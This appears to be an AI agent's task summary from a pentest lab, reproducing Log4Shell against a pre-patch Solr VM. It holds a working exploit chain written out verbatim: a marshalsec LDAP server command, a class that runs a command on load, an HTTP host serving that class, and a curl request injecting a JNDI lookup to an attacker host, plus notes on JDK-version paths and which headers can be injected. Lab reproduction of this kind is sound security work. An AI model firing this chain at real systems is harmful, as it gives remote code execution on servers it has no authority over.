# Reproduced Log4Shell (CVE-2021-44228) end-to-end on a training Solr instance — JNDI LDAP → local class load → cmd.

Rollout context: cwd was `C:\Workspace\pentest-lab`, lab VM Apache Solr 8.11.1 (pre-patch, JDK 8u181, log4j 2.14.1). Purpose was the classic Log4Shell reproducibility exercise.

## Task 1: JNDI LDAP payload via User-Agent header → local malicious class → cmd shell

Outcome: success

Preference signals:
- Chinese narration; commands verbatim in English.
- The user wanted marshalsec-based LDAP server + a lab HTTP server for class delivery — no third-party tool chain.

Key steps:
- Started `marshalsec` LDAP server: `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<attacker>:8888/#Exploit"`.
- Compiled `Exploit.class`: static block calls `Runtime.getRuntime().exec("cmd.exe /c calc.exe")` (lab-safe payload).
- Hosted the class on a local HTTP server (`python -m http.server 8888` in the class dir).
- Fired the request: `curl 'http://<solr>:8983/solr/admin/cores' -H 'User-Agent: ${jndi:ldap://<attacker>:1389/Exploit}'`.
- On the target: calc.exe spawned (verified via `tasklist` from another session).

Failures and how to do differently:
- First attempt used JDK 11 target — the class-loading path is different (LDAP object factory needed instead of direct class URL). Switched to JDK 8u181 for the classic path.
- Firewall on the attacker box blocked inbound 1389; opened it via `netsh advfirewall`.
- User-Agent injection point picked because Solr logs UA at INFO level; other headers (X-Forwarded-For) also work if logged.

Reusable knowledge:
- Log4Shell class load path depends on JDK version: 8u191 and earlier permit direct class URL; 8u191+ / 11+ require the object factory bounce.
- Detection: any log field the app writes via log4j is a candidate — User-Agent, X-Forwarded-For, X-Api-Version, Referer.
- Patched log4j 2.17.0+ removes JNDI lookup entirely; 2.15.0-2.16.0 have partial mitigations that were themselves bypassed.
